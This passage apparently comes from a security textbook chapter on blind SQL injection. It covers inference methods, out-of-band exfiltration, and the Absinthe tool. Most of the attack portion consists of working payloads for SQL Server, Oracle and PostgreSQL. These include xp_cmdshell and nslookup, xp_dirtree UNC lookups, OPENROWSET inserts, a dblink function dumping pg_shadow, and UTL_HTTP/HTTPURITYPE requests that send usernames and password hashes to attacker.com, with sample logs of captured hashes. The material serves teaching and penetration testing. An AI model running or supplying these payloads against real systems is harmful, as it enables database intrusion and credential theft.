WHERE review_author=‘ Mad’+(SELECT CASE WHEN \nASCII(SUBSTRING(SYSTEM_USER,i ,1))>k THEN ‘Bob’ END) + ’’  \nHere is  the matching bit -by-bit example: \nSELECT COUNT( ∗) FROM reviews WHERE review_author=‘ Mad’+(SELECT CASE WHEN \nASCII(SUBSTRING(SYSTEM_USER,i ,1))&2j=2j THEN ‘Bob’ END) + ’’  \nIf either of the above two queries returned results only seen for the search input ‘MadBob’, \nthen in the binary search exploit the i th byte had an ASCII value greater than k  or in the bit -by-\nbit exploit the i th byte had the j th bit set to 1.  \nWe could also force a database error in cases where the page does not return content but \ndoes trap database errors and displays either a default error page or an HTTP 500 page. One \ncommon example of this is ASP.NET websites running on IIS 6 and 7 that do not have the \n<customError> tag set in the web.config configuration file (or where this can be bypassed—refer to tip), and where the vulnerable page does not trap exceptions. If a broken SQL query is submitted to the database then a page similar to that shown in Figure 5.8  is displayed and \ndigging deeper into the returned HTTP headers reveals that the HTTP status was 500 ( Figure \n5.9). The error page  does not lend itself to the regular error -based  extraction methods since \ndatabase error messages are not included.  \nTip \nIn the instance an ASP.NET application catches unhandled exceptions using a custom error page defined in the \nweb.config <customError> tag, introducing or modifying an aspxerrorpage par ameter to point to a non -existent \npage can often bypass the error page. Therefore if the following resulted in a custom error page via this \nfunctionality:  \ncount_reviews.aspx?review_author=MadBob’  \nThe following will often reveal the underlying error that wa s caught:  \ncount_reviews.aspx?review_author=MadBob’&aspxerrorpath=/foo  \n \n\nFigure 5.8  Default Exception Page in ASP.NET  \n \nFigure 5.9  Response Headers Showing 500 Status  \nIntroducing errors can be tricky. The error cannot exist in the syntax since this would cause \nthe query to always fail before execution; rather we want the query to fail only when some \ncondition exists. This is often accomplished with a divide -by-zero clause combined with a \ncondi tional CASE:  \nselect ∗ FROM reviews WHERE review_author=‘ MadBob’+(CASE WHEN \nASCII(SUBSTRING(SYSTEM_USER,i ,1))>k THEN CAST(1/0  AS CHAR) END)  \nThe underlined division operation will only be attempted if the k th bit of byte i  is 1, allowing \nus to infer state.  \nOracle Response Techniques  \nThe Oracle response -based exploits are quite similar in structure to MySQL, PostgreSQL, and \nSQL Server, but obviously rely on different functions for the key bits. For example, to determine whether the database user is a DBA, the following SQL query will r eturn rows when \nthis is true. Otherwise no rows are returned:  \nSELECT ∗ FROM reviews WHERE review_author=‘ MadBob’ AND \nSYS_CONTEXT(‘ USERENV’ ,‘ISDBA’)=‘TRUE’; \nLikewise, a bit -by-bit inference exploit that measures state based on whether results are \nreturned or not can be written with a second injected predicate:  \nSELECT ∗ FROM reviews WHERE review_author= ‘MadBob’  \nAND BITAND(ASCII(SUBSTR((…),i ,1)),2j)=2j \n\nThe binary search form is:  \nSELET ∗ FROM reviews WHERE review_author=‘ MadBob’ AND ASCII(SUBSTR((… ),i,1)) > k  \nUsing Oracle’s string concatenation it is also possible to make the exploit safe to use in a \nfunction or procedure argument list by rewriting as a split and balanced string with \nconcatenation and a CASE statement:  \nMad’||(SELECT CASE WHEN (ASCII(SUBSTR((…), i,1)) > k THEN ‘Bob’ ELSE ’’ END FROM DUAL)||’;  \nWith the above snippet, the full ‘MadBob’ string is only generated when the inference test \nreturns true.  \nFinally, it also possible to generate runtime errors with a divide -by-zero clause, similar to \nSQL Server . Here is a sample snippet that contains a zero divisor in a split and balanced bit -\nby-bit approach:  \nMadBob’||(SELECT CASE WHEN BITAND((ASCII(SUBSTR((…),i ,1))2j)=2j THEN CAST(1/0 AS CHAR) ELSE \n’’ END FROM DUAL)||’;  \nObserve how the division had to be wrappe d in a CAST() otherwise the query would fail \nwith a syntax error. When the inference question returned TRUE in a vulnerable page running on Apache Tomcat, then an uncaught exception was thrown resulting in the HTTP 500 server error shown in Figure 5.10. \n \n\nFigure 5.10  Uncaught Oracle Exception Caused by a Zero Divisor  \nReturn ing More Than 1  bit of Information  \nSo far each inference technique has been focused on deriving the status of a single bit or byte \nbased on whether the inference question returned TRUE or FALSE, and the fact that only two states were possible permitted the  extraction of exactly one bit of information per request. If \nmore states are possible then more bits can be extracted per request which would improve the bandwidth of the channel. The number of bits that can be extracted per request is log\n2 n where \nn is the number of possible states a request could have. To quantify this with actual figures, \neach request would need 4 states to return 2  bits, 8 states to return 3 bits, 16 states to return \n4 bits, and so on. But how can more states be introduced into a r equest? In some cases it is not \npossible to introduce more states just as blind SQL injection is not possible in all vulnerable injection points, but it often is possible to extract more than one bit. In cases where the inference question is answered with timing methods or content methods, then it is possible to introduce more than two states. \nNote  \nAdding an additional state does not add a full additional bit of information, and each additional state adds less \ninformation than the preceding bit. Were eight states available, we would still require three requests to extract a \nregular 8 -bit byte; to extract the information in two requests requires a minimum of 128 states, and the only way \nto retrieve a full byte in a single blind query is if there are 256 possi ble states. Where states are not powers of 2, \ncomplexity arises too, since the value being extracted needs to be translated into a number with the base being the \npossible states. In other words, if three states are available then extracted data must first be converted into a \nternary (or base -3) number, and five states require base -5 numbers. Performing these conversions makes exploits \nlonger and less reliable, and so trying to extract more than a single bit per request is quite unusual.  \nUp until now, the bi t-by-bit approach has asked whether bit j  of byte i  is 1. If four states are \npossible, then the inference question could be a series of questions that ask whether the two bits starting at bit j  of byte i are 00, 01, 10, or 11. Where timing is used as the i nference \nmethod, this could be phrased as the following SQL Server CASE statement:  \nCASE \n WHEN ASCII(SUBSTRING((…),i ,1))&(2j+2j+1) = 0  \n  THEN WAITFOR DELAY ‘00:00:00’  \n WHEN ASCII(SUBSTRING((…),i ,1))&(2j+2j+1) = 2j \n  THEN WAITFOR DELAY ‘00:00:05’  \n WHEN ASCII(SUBSTRING((…),i ,1))&(2j+2j+1) = 2j+1 \n  THEN WAITFOR DELAY ‘00:00:10’  \n ELSE \n  THEN WAITFOR DELAY ‘00:00:15’  \nEND \nThis does not seem particularly remarkable; in the worst case (where the bit string is ‘11’) \nthis CASE statement yields a 15  s delay w hich is longer than if these two bits were extracted \none at a time with a 5  s delay, but on uniformly distributed data the average delay is under \n10 s. Most significantly, this approach requires fewer requests so the total time spent on \nrequest submission and response transmission is lowered, and the likelihood of detection via abnormal request counts decreases.  \nAnother option to increase the number of states is to alter the search term in a WHERE \nclause so that, for instance, one of four possible results i s displayed allowing us to infer the bit \nstring:  \nSELECT ∗ FROM reviews WHERE review_author= ’’ + (SELECT  \nCASE \n WHEN ASCII(SUBSTRING((…),i ,1))&(2j+2j+1)= 0 \n  ‘MadBob’  \n WHEN ASCII(SUBSTRING((…),i ,1))&(2j+2j+1)= 2j \n  ‘Hogarth’  \n WHEN ASCII(SUBSTRING((…),i ,1))&(2j+2j+1)= 2j+1 \n  ‘Jag’  \n ELSE \n  ‘Eliot’  \nEND) \nWhen the search results match ‘MadBob’ then the inference is ‘00’, when ‘Hogarth’ then \n‘01’, when ‘Jag’ then ‘10’ and when ‘Eliot’ then ‘11’. \nThe two CASE statements provided above demonstrate how to improve the  bit-by-bit \napproach, and it is also possible to improve the binary search approach. One of the major \ndrawbacks to the binary search is that only a single relation is tested, namely “greater than.” Say the ASCII value of the byte under examination is 127, then the first inference question asks “Is 127 >  127?” The answer is FALSE and so seven further questions must be used to \nrefine the question until we ask “Is 127 >  126?” after which the value is inferred. Instead, we \nwould like to insert a second, shortcut, question after the first inference question: “Is 127 =  127?” but include both questions in a single request. We can do this through a CASE \nstatement implementing a binary search method combined with an error -generating divide -by-\nzero clause:  \nCASE \n WHEN ASCII(SUBSTRING((…),i ,1)) > k  \n  THEN WAITFOR DELAY ‘00:00:05’  \n WHEN ASCII(SUBSTRING((…),i ,1)) = k  \n  THEN 1/0  \n ELSE \n  THEN WAITFOR DELAY ‘00:00:00’  \nEND \nThus if an error is observed then i  = k, or if the request is delayed by 5 s then i  is greater than \nk otherwise i  is less than k. \n \nUsing Alternative Channels  \nThe second major category of techniques for retrieving data with blind SQL injection \nvulnerabilities is the use of alternative or out -of-bound channels. Instead of relying on an \ninference technique to derive data, channels apart from the HTTP response are co -opted into to \ncarrying chunks of data for us. The channels are not applicable to all databases as they tend to rely on the database’s supported functionality; by way of example DNS is a channel that  can \nbe utilized with PostgreSQL, SQL Server, and Oracle, but not with MySQL.  \nWe will discuss four separate alternative channels for blind SQL injection: database \nconnections, DNS, email, and HTTP. The basic idea is to package the results of a SQL query in such a way that they can be carried back to the attacker using one of the four alternative \nchannels.  \nDatabase Connections  \nThe first example alternative channel is specific to Microsoft SQL Server and permits an attacker to create a connection from the victim’s database to the attacker’s database and carry query data over the connection. This is accomplished using the OPENROWSET command and can be an attacker’s best friend where available. For this attack to work, the victim database must be able to open a TCP connection to the attacker’s database, usually on the default port \n1433; if egress filtering is in place at the victim or the attacker is performing ingress filtering then the connection will fail. However, you can connect to a different port, simply b y \nspecifying the port number after the destination IP address. This can be very useful when the remote database server can connect back to your machine only on a few specific ports.  \nOPENROWSET is used on SQL Server to perform a one -time connection to a rem ote OLE \nDB data source (e.g. another SQL Server). One example legitimate usage is to retrieve data that resides on a remote database as an alternative to linking the two databases, which is more suited to cases when the data exchange needs to be performed on a regular basis. A typical way to call OPENROWSET is as follows: \nSELECT ∗ FROM OPENROWSET(‘ SQLOLEDB’ , ‘Network=DBMSSOCN; Address=10.0.2.2;uid=sa; \npwd=Mypassword ’, ‘SELECT review_author FROM reviews’ ) \nWhat happens here is that we connect to the SQL Serve r at the address 10.0.2.2 as user ‘sa’, \nand we run the query “ SELECT review_author FROM reviews ”, whose results are transferred back \nand visualized by the outermost query. The user ‘sa’ is a user of the database at the address \n10.0.2.2, and not of the data base where OPENROWSET is executed. Also note that in order to \nsuccessfully perform the query as user ‘sa’ we must successfully authenticate providing its \ncorrect password.  \nWe have already been introduced to OPENROWSET in Chapter 4  so let us concern \nourselves mainly with its application to blind SQL injection. Although the example usage above retrieves  results from a foreign database with the SELECT statement, we can also use \nOPENROWSET to transmit  data to a foreign data base using an INSERT statement:  \nINSERT INTO OPENROWSET(‘SQLOLEDB’,‘Network=DBMSOCN; Address=192.168.0.1;uid=foo; \npwd=password’, ‘SELECT ∗ FROM attacker_table’ ) SELECT name FROM sysobjects WHERE xtype=‘ U’ \nBy executing this query, names of user tables on the  local database are inserted into \nattacker_table which resides on the attacker’s server at the address 192.168.0.1. Of course, in order for the command to complete correctly, attacker_table’s columns must match the results of the local query so the table w ould consist of a single varchar column.  \nClearly this is a great example of an alternative channel; we can execute SQL that produces \nresults and carries them in real -time back to the attacker. Since the channel is not dependent at \nall on the page response, OPENROWSET is an ideal fit for blind SQL injection vulnerabilities. \nThis has been recognized by tool authors; there are at least two public tools that rely on OPENROWSET for exploitation: DataThief by Cesar Cerrudo and BobCat by nmonkee. The first is a pr oof-of-concept tool that demonstrates the power of OPENROWSET and the second \nis a tool that removes much of the complexity of executing OPENROWSET attacks through a GUI.  \nThis technique is not limited to data. If you have administrative privileges and have access \nto the xp_cmdshell extended procedure (see Chapter 6  for more information on this topic), the \nsame attack can also be used to obtain the output of commands that have been executed at the operating system level. For instance, the following query would make the target database send the list of file and directories of C: \\ \nINSERT INTO OPENROWSET(‘SQLOLEDB’,‘Network=DBMSSOCN;Address=www.attacker.com:80; uid=sa; \npwd=53kr3t’,‘SELECT ∗ FROM table’ ) EXEC master..xp_cmdshell ‘dir C:\\ ’ \nOracle also supports creating database links, though these statements cannot be embedded in \nother queries thus limiting their usefulness.  \nPostgreSQL drivers, on the other hand, often accept stacked queries. A database superuser \ncan enable the ‘dblink’ extension in PostgreSQL 9.1 or newer using:  \nCREATE EXTENSION dblink;  \nFrom there, the dblink family of commands can be leveraged to copy data from the victim \ndatabase to a PostgreSQL instance controlled by the attacker. However it is not for the fa int-\nhearted since the functions only operate on rows, not result sets. If you follow this route, then \nbe prepared to write PL/pgSQL functions that rely on cursors to iterate over the data. One simple example that will dump database users and their password hashes is:  \nCREATE OR REPLACE FUNCTION dumper() RETURNS void AS $$  \nDECLARE  \n rvar record;  \nBEGIN  \n FOR rvar in SELECT usename||‘,’||passwd as c FROM pg_shadow  \n LOOP \n  PERFORM dblink_exec(‘host=172.16.0.100 dbname=db user=uname password=Pass’, ‘insert into \ndumper values(‘‘‘||rvar.c||’’’)’);  \n END LOOP;  \nEND; \n$$ LANGUAGE ‘plpgsql’;  \nDNS Exfiltration  \nAs the most well known alternative channel, DNS has been used both as a marker to find SQL injection vulnerabilities as well as a channel on which to carry data. The advantages of DNS are numerous:  \n• Where networks have only ingress but no egress filtering or TCP -only egress filtering the \ndatabase can issue DNS requests directly t o the attacker.  \n• DNS uses UDP, a protocol that has no state requirements so exploits can “fire -and-forget.” If \nno response is received for a lookup request then at worst a non- fatal error condition occurs.  \n• The design of DNS hierarchies means that the vu lnerable database does not have to be able \nto send a packet directly to the attacker. Intermediate DNS servers will mostly be able to \ncarry the traffic on the database’s behalf.  \n• When performing a lookup, the database will by default rely on the DNS serve r that is \nconfigured into the operating system, which is normally a key part of the basic system setup. Thus in all but the most restricted networks, a database can issue DNS lookups that will exit the victim’s network.  \nThe drawback of DNS is that the attacker must have access to a DNS server that is \nregistered as authoritative for some zone (‘ attacker.com ’ in our examples) where he can \nmonitor each lookup performed against the server. Typically this is performed either b y \nmonitoring query logs or by running ‘tcpdump’.  \nPostgreSQL, SQL Server, and Oracle all have the ability to directly or indirectly cause a \nDNS request to be made. Under Oracle this is possible with the  UTL_INADDR package which \nhas an explicit GET_HOST_ADDR ESS function to lookup forward entries and \nGET_HOST_NAME to lookup reverse entries:  \nUTL_INADDR.GET_HOST_ADDRESS(‘www.victim.com’) returns 192.168.0.1  \nUTL_INADDR.GET_HOST_NAME(‘192.168.0.1’) returns www.victim.com  \nThese are more useful than the previously c overed DBMS_LOCK.SLEEP function, since \nthe DNS functions do not require PL/SQL blocks; thus they can be inserted into subqueries or \npredicates. The next example shows how the database login can be extracted by an insertion \ninto a predicate:  \nSELECT ∗ FROM reviews WHERE review_author=UTL_INADDR.GET_HOST_ADDRESS((SELECT USER FROM \nDUAL)||‘.attacker.com’)  \nPostgreSQL does not support direct lookups, but DNS queries can be initiated through a \ntrick in the XML parsing libraries. You may recall XML entity injection as an early attack \nagainst XML parsers; it is possible to use this attack against PostgreSQL databases to cause DNS lookups. In the example that follows, a lookup that contains the database username is sent to the DNS server for ‘ attacker.com ’: \nSELECT XMLPARSE(document ‘<?xml version=“1.0” encoding=“ISO- 8859-1”?><!DOCTYPE x [ <!ELEMENT \nx ANY ><!ENTITY xx SYSTEM “http:// ‘||user||’attacker.com./” >]>’);  \nWhere dblink is installed on PostgreSQL, a hostname can be specified i n the connection \nstring causing a DNS lookup, but this requires superuser access.  \nSQL Server too does not support an explicit lookup mechanism, but it is possible to also \ninitiate indirect DNS requests through certain stored procedures. For example, one could \nexecute the ‘nslookup’ command through the xp_cmdshell procedure (only available to the administrative user and in SQL Server 2005 and later disabled by default):  \nEXEC master..xp_cmdshell ‘nslookup www.victim’  \nThe advantage of using ‘nslookup’ is that the attacker can specify their own DNS server to \nwhich the request should be sent. If the attacker’s DNS server is publicly available at 192.168.1.1 then the SQL snippet to directly lookup DNS requests is:  \nEXEC master..xp_cmdshell ‘nslookup www.victim 192.168.1.1’  \nWe can tie this into a little shell scripting to extract directory contents:  \nEXEC master..xp_cmdshell ‘for /F “tokens=5”%i in (‘‘dir c: \\’’) do nslookup %i.attacker.com’  \nwhich produces the lookups:  \nhas.attacker.com.victim.com . \nhas.attacker.com . \n6452- 9876.attacker.com.victim.com . \n6452- 9876.attacker.com . \nAUTOEXEC.BAT.attacker.com.victim.com . \nAUTOEXEC.BAT.attacker.com . \ncomment.doc.attacker.co m.victim.com. \ncomment.doc.attacker.com . \n \nwmpub.attacker.com.victim.com . \nwmpub.att acker.com . \nfree.attacker.com.victim.com . \nfree.attacker.com . \nClearly the exploit had problems; we do not receive all output from the ‘dir’ as only the fifth \nspace- delimited token is returned from each line and this method cannot handle file or \ndirectory names that have spaces or other disallowed domain name characters. The observant \nreader would also have noticed that each filename is queried twice and the first quer y is always \nagainst the domain ‘ victim.com’ . \nNote  \nThis is the default search domain for the database machines and lookups on the default domain can be prevented \nby appending a period (.) to the name that is passed to nsloo kup. \nThere are other stored procedures that will cause a SQL Server to lookup a DNS name and \nthey rely on Windows’ built -in support for network UNC paths. Many Windows file -handling \nroutines can access resources on UNC shares and when attempting to connect  to a UNC path \nthe OS must first lookup the IP address. For instance, if the UNC path supplied to some file -\nhandling function is ‘ \\\\poke.attacker.com \\blah’ then the OS will first perform a DNS lookup on \n‘poke.attacker.com ’. By monitoring the server that is authoritative for the ‘ attacker.com ’ zone, \nthe attacker can then ascertain whether the exploit was successful or not. The proc edures are \nspecific to SQL Server versions:  \n• xp_getfiledetails (2000, requires a path to a file)  \n• xp_fileexist (2000, 2005, 2008, and 2008 R2, requires a path to a file)  \n• xp_dirtree (2000, 2005, 2008, and 2008 R2, requires folder path)  \nFor instance, to extract the database login via DNS one could use:  \nDECLARE @a CHAR(128);SET @a=‘\\ \\’+SYSTEM_USER+‘.attacker.com.’; EXEC master..xp_dirtree @a  \n\nIn the snippet above, an intermediate variable was used to store the path since string \nconcatenation is not permitte d in the procedure’s argument list. The SQL indirectly caused a \nDNS lookup for the hostname sa.attacker.com . indicating that an administrative login was \nused. \nAs was pointed out when performing DNS lookups through xp_cmdshell, the presence of \nillegal characters in a path will cause the resolver stub to fail without attempting a lookup, as \nwill a UNC path that is over 128 characters long. It is safer  to first convert data we wish to \nretrieve into a format that is cleanl y handled by DNS and one method for this is to convert the \ndata into a hexadecimal representation. SQL Server contains a function called FN_VARBINTOHEXSTR() that takes as its sole argument a parameter of type VARBINARY and returns a hexadecimal representat ion of the data:  \nSELECT master.dbo.fn_varbintohexstr(CAST(SYSTEM_USER as VARBINARY))  \nproduces:  \n0x73006100  \nwhich is the Unicode form of ‘sa’.  \nThe next problem is that of path lengths. Since the length of data is quite likely to exceed \n128 characters we run the risk of either queries failing due to excessively long paths or, if we only take the first 128 characters from each row, missing out on data. By increasing the complexity of the exploit we can retrieve specific blocks of data using a SUBSTRING() call. The example below performs a lookup on the first 26 bytes from the first review_body column in the reviews table:  \nDECLARE @a CHAR(128);  \nSELECT @a=‘\\ \\’+master.dbo.fn_varbintohexstr(CAST(SUBSTRING((SELECT TOP 1  \n CAST(review_body AS CHAR(255)) FROM reviews),1,26) AS  \n VARBINARY(255)))+‘.attacker.com.’;  \nEXEC master..xp_dirtree @a;  \nwhich produced \n“0x4d6f7669657320696e20746869732067656e7265206f667465.attacker.com .” or “Movies in \nthis genre ofte.”  \nPath length is unfortunately not the last complexity that we face. Although UNC paths can \nbe at most 128 characters, thi s includes the prefix ‘ \\\\’, the domain name that is appended as \nwell as any periods used to separate labels in the path. Labels are strings in a path that are \nseparated by periods, so the path “ blah.attacker.com ” ha s three labels, namely “blah,” \n“attacker,” and “com.” It is illegal to have a single 128 byte label since labels can have at most 63 characters according to DNS standards. In order to format the pathname such that it fulfills the label length requirements,  a little more SQL is required to massage the data into the correct \nform.  \nAn additional small detail that can get in the way when using DNS is that intermediate \nresolvers are allowed to cache results which might prevent lookups from reaching the attacker’s  DNS server. This can be bypassed by including a variable value in the lookup so that \nsubsequent lookups are not identical; current time is one option as is the row number or a true random value.  \nFinally, enabling the extracting of multiple rows of data re quires wrapping all of the above \nrefinements in a loop that extracts rows one by one from a target table, breaks the data up into \nsmall chunks, converts the chunks into hexadecimal, insert periods every 63 characters in the converted chunk, prepends ‘ \\\\’ and appends the attacker’s domain name, and executes a stored \nprocedure that indirectly causes a lookup.  \nThe challenge of extracting all data (regardless of length or type) through DNS is tricky and \nsolvable on SQL Server database mainly due to T -SQL which provides loops, conditional \nbranching, local variables, and so on. Even though Oracle has explicit DNS functions, its more serious limitations from an attacker’s point of view (lack of PL/SQL injection in SQL) prevents the exploitation seen on SQL Server . \nTools & traps… \nZoning Out  \nIn the examples covered here we assume that the attacker controls the zone ‘ attacker.com ’ and has full access to \nthe authoritative server for that zone. However, when using DNS as an exfiltratio n channel on a regular basis for \nassessments or other work, using your zone’s authoritative DNS server as the staging ground for the attack seems \nbrash. Apart from the fact that this requires granting all colleagues unfettered access to the server, it is also not \nflexible. Rather it creates at least one subdomain that has an NS record pointing to the machine to which you grant \nfull access to all colleagues. One could even create a subdomain per colleague with the NS pointing to a machine \ncontrolled by that colleague. Here is a quick run through on how a subdomain can be added to the zone \n‘attacker.com ’ in the BIND name server software. In the zone file for domain ‘ attacker.com ’ add the l ines:  \ndnssucker.attacker.com. NS listen.attacker.com.  \nlisten.attacker.com. A 192.168.1.1  \nThe first line contains the NS record while the second provides a glue record. On the machine \n‘listen.attacker.com ’, a DNS server is installed that is authoritative for the domain ‘ dnssucker.attacker.com ’. \nSubsequent DNS exfiltration will use ‘. dnssucker.attacker.com ’ as a suffix.  \nEmail Exfiltration  \nBoth SQL Server and Oracle support sending emails from within the database and email \npresents an intriguing exfiltration channel. Quite similarly to DNS, emails sent using the Simple Mail Transport Protocol (SMTP) do not r equire a direct connection between the sender \nand recipient. Rather, an intermediate network of Mail Transfer Agents (MTA), or email servers, carries the email on the sender’s behalf. The only requirement is that there exists a route from the sender to rec eiver and this indirect approach is a useful channel for blind SQL \ninjection where other more convenient channels are not possible. A limitation of the approach is its asynchronous nature; an exploit is sent and the email could take a while to arrive hence  \nthere are no tools that the authors are aware of that support SMTP as a channel for blind SQL injection.  \nChapter 4  contains an in -depth discussion on how one might setup and use email facilities \nwithin SQL Server and Oracle.  \nHTTP Exfiltration  \nThe final exfiltration channel examined here is HTTP, which is available in databases that provide functionality for querying external web servers and usable in installations  where the \ndatabase machine has network -layer permission  to access web resources controlled by the \nattacker. SQL Server and MySQL do not have default mechanisms for constructing HTTP requests, but one could get there with custom extensions. PostgreSQL too does not have a \nnative method for invoking HTTP requests , however if an external language such as Perl or \nPython was been enabled at build time, then one can write PostgreSQL functions that wrap the \nexternal language’s HTTP libraries. Oracle on the other hand has an explicit function and object type by which HT TP requests can be made, provided by the UTL_HTTP or \nHTTPURITYPE packages. The function and the object type are quite useful as they can be used in regular SQL queries so a PL/SQL block is not required. Either method may be granted to PUBLIC (depending on the version of Oracle used) in which case any database user can \nexecute them. HTTPURITYPE is not mentioned in most Oracle hardening guides and is normally not removed from PUBLIC. HTTP requests are as powerful as UNION SELECTs. Usage of the functions / obj ect types is as follows:  \nUTL_HTTP.REQUEST(‘www.attacker.com/’)  \nHTTPURITYPE(‘\\ www.attacker.com/’).getclob  \nThis can be combined with a blind SQL injection vulnerability to form exploits that combine \nthe data we wish to extract with a request to a web server we control using string concatenation:  \nSELECT ∗ FROM reviews WHERE review_author=UTL_HTTP.REQUEST(‘ www.attacker.com/’ ||USER)  \nAfter reviewing the request logs on the web server, we find the log entry containing the \ndatabase login (underlined):  \n192.168.1.10 - - [13/Jan/2009:08:38:04 -0600] “GET /SQLI HTTP/1.1” 404 284  \nThis Oracle function has two interesting characteristics: as part of the request a hostname \nmust be converted into an IP address implying a second method to cause DNS requests to be issued where  DNS is the exfiltration channel, and the UTL_HTTP.REQUEST function \nsupports HTTPS requests which could aid in hiding outgoing web traffic. The role of UTL_HTTP/HTTPURITYPE is often underestimated. It is possible to download an entire table with this function by using proper SQL statements. Depending on the position of injection in the query it is possible that the following approach works:  \nSELECT ∗ FROM unknowntable UNION SELECT NULL, NULL, NULL FROM \nLENGTH(UTL_HTTP.REQUEST( ‘www.attacker.com/ ’||username||chr(61)|| password))  \nHere all usernames and passwords are sent to the access log of the attacker.  \nThis channel can also be used for the split and balance technique (where the original \nparameter’s value was ‘aa’):  \nFor Oracle 11g only  \n‘a’||CHR(UTL_HTTP.REQUES T(‘www.attacker.com/’||(SELECT sys.stragg(DISTINCT \nusername||chr(61)||password||chr(59)) FROM dba_users)))||’a  \nproduces the log entry:  \n192.168.2.165 - - [14/Jan/2009:21:34:38 +0100] “GET \n/SYS=AD24A888FC3B1BE7;SYSTEM=BD3D49AD69E3FA34;DBSNMP=E066D214D5421CCC;IBO=7A0F2B316C212D67\n;OUTLN=4A3BA55E08595C81;WMSYS=7C9BA362F8314299;ORDSYS=7C9BA362F8314299;ORDPLUGINS=88A2B2C183431F00 HTTP/1.1” 404 2336\n \nFor Oracle 9i Rel. 2 and higher + XMLB  \n‘a’||CHR(UTL_HTTP.REQUEST(‘attacker.com/’||(SELECT \nxmltransform(sys_xmlagg(sys_xmlgen(username)),xmltype(‘<?xml \nversion=“1.0”?><xsl:stylesheet version=“1.0” \nxmlns:xsl=“http://www.w3.org/1999/XSL/Transform”><xsl:template match=“/”><xsl:for- each \nselect=“/ROWSET/USERNAME”><xsl:value- of select=“text()”/>;</xsl:for -\neach></xsl:template></xsl:stylesheet>’)).getstringval() listagg from all_users)))||’a  \nproduces the log entry:  \n192.168.2.165 - - [14/Jan/2009:22:33:48 +0100] “GET \n/SYS;SYSTEM;DBSNMP;IBO;OUTLN;WMSYS;ORDSYS;ORDPLUGINS HTTP/1.1” 404 936  \nUsing HTTPURITYPE  \n… UNION SELECT \nnull,null,LENGTH(HTTPURITYPE(‘http://attacker/’||username||’=’||password).getclob FROM sys.user$ WHERE type#=0 AND LENGTH(password)=16)\n \nThe access log will contain all user names and passwords from the database.  \nLastly we can try injection i n an ORDER BY clause which is sometimes a little bit more \ncomplicated because the Oracle optimizer ignores sort orders if the result is known or if only \none column is present in the query:  \nSELECT banner FROM v$version ORDER BY LENGTH((SELECT COUNT(1) FROM dba_users WHERE \nUTL_HTTP.REQUEST(‘www.attacker.com/’||username||‘=’||password) IS NOT null));  \nproduces the log entry:  \n192.168.2.165 - - [15/Jan/2009:22:44:28 +0100] “GET /SYS=AD24A888FC3B1BE7 HTTP/1.1” 404 336  \n192.168.2.165 - - [15/Jan/2009:22:44:28 +0100] “GET /SYSTEM=BD3D49AD69E3FA34 HTTP/1.1” 404 \n339 \n192.168.2.165 - - [15/Jan/2009:22:44:28 +0100] “GET /DBSNMP=E066D214D5421CCC HTTP/1.1” 404 \n339 \n192.168.2.165 - - [15/Jan/2009:22:44:28 +0100] “GET /IBO=7A0F2B316 C212D67 HTTP/1.1” 404 337  \n192.168.2.165 - - [15/Jan/2009:22:44:28 +0100] “GET /OUTLN=4A3BA55E08595C81 HTTP/1.1” 404 \n338 \n192.168.2.165 - - [15/Jan/2009:22:44:28 +0100] “GET /WMSYS=7C9BA362F8314299 HTTP/1.1” 404 \n338 \n192.168.2.165 - - [15/Jan/2009:22:44:28 +0100] “GET /ORDSYS=7EFA02EC7EA6B86F HTTP/1.1” 404 \n339 \n192.168.2.165 - - [15/Jan/2009:22:44:29 +0100] “GET /ORDPLUGINS=88A2B2C183431F00 HTTP/1.1” \n404 343  \nICMP Exfiltration  \nJust as DNS can carry data in channels often overlooked by defenders, ICMP too can be \nuseful. In times past, it was not uncommon for ICMP to be allowed through networks with minimal filtering and this made it an ideal choice as a tunneling mechanism. However, increasing network controls have reduced the usefulness of ICMP tunnels in recent years. Add \nto this the fact that databases do not provide the low -level interfaces to construct ICMP packets \ndirectly or indirectly, and the channel loses its allure. The few SQL injection tools that do support ICMP channels rely on secondary helper applic ations to perform packet construction.  \n \nAutomating blind SQL injection exploitation  \nThe techniques discussed in this chapter regarding blind SQL injection enable the extraction \nand retrieval of database contents in a highly automated manner using either inf erence \ntechniques or alternative channels. A number of tools are available to help an attacker exploit blind SQL injection vulnerabilities and information and examples are provided below for six popular tools. \nAbsinthe  \nThis GPL tool (previously known as SQ LSqueal) was one of the first automated inference \ntools in widespread use and is thus a good starting point for examining automated blind SQL injection exploitation.  \nRequirements  \nWindows/Linux/Mac (.NET Framework or Mono)  \nScenarios  Generic error page, controlled output  \nSupported Databases  Oracle  \n PostgreSQL  \n SQL Server  \n Sybase  \nMethods  Inference response -based binary search  \n Classic errors  \nURL  www.0x90.org/releases/absinthe/  \nAbsinthe provides a handy GUI that enables an attacker to extract the full contents of a \ndatabase, contains enough configuration options to satisfy most injection scenarios, and can \nutilize both classic error methods or resp onse-based inference methods for data extraction. The \nresponse string that differentiates between two inference states must be easily identifiable for \nAbsinthe; one drawback to the tool is that the user cannot provide a customized signature for TRUE or FAL SE states. Instead the tool attempts to perform a diff on a TRUE and FALSE \nrequest, and this causes the tool to fail in cases where the page includes other data not influenced by the inference question. One example is in search pages that echo the search string back in the response. If two separate but equivalent inference exploits are provided, the \ntwo responses will each contain a unique search string rendering the diff meaningless. There is a tolerance one can adjust, but this is not as efficient as providing signatures. \nFigure 5.11 shows the main Absinthe screen. First, the injection type is selected, either \nBlind Injection  or Error Based , after which the database is chosen from a list  of supported \nplugins. The Target URL  is then entered along with whether the request is formatted as a \nPOST or GET. Finally, each parameter that should be contained in the request is entered in the Name  textbox along with a Default Value . If the parameter is susceptible to SQL injection, \nthen the Injectable Parameter  checkbox should be selected, as should the Treat Value as \nString  checkbox if the parameter is of type string in the SQL query. Do not forget to add in all \nparameters needed for the vulnerable page to process the request;  this includes hidden fields \nsuch as __VIEWSTATE on .NET pages. Once the configuration is complete, click Initialize Injection . This sends a bunch of test requests in order to determine the response difference that \nthe inference will be based on. If no err ors are reported, then click on the DB Schema  tab, \nwhich displays two active buttons: Retrieve Username  and Load Table Info. The first button \nwill retrieve and display the database login used by the vulnerable page and the second button will retrieve a lis t of user -defined tables from the current database. Once table information has \nbeen loaded, click on a table name in the tree view of database objects and click Load Field Info, which will retrieve a list of all column names in the selected table. As soon as that has \nbeen completed, click on the Download Records  tab, provide an output filename in the \nFilename  textbox, select the columns you wish to retrieve by clicking on the column name and \nthen clicking Add , and finally click on Download Fields to XML . This will dump the selected \ncolumns to the output file, producing an XML document containing all rows from the selected columns in the target table.  \n \nFigure 5.11  Absinthe v1.4.1 Configuration Tab  \nBSQL Hacker  \nThe next tool under examination utilizes a number of inference techniques to enable the \nattacker to extract database contents and is experimental in its appr oaches: although still in \nbeta there are numerous nifty features.  